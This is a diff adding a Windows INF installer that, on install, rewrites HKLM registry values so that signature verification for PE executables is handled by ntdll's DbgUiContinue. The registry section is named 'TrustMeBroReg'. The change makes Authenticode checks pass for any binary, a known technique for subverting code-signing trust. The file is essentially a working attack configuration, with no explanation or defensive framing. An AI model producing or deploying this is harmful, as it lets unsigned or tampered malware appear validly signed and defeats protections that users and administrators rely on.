@@ -1,0 +1,11 @@
+[Version]
+Signature="$Windows NT$"
+
+[DefaultInstall]
+AddReg=TrustMeBroReg
+
+[TrustMeBroReg]
+; Target the SIP GUID for PE files: {C689AAB8-8E78-11D0-8C47-00C04FC295EE}
+; 0x00000000 = FLG_ADDREG_TYPE_SZ (String)
+HKLM,"SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}","Dll",0x00000000,"C:\Windows\System32\ntdll.dll"
+HKLM,"SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}","FuncName",0x00000000,"DbgUiContinue"
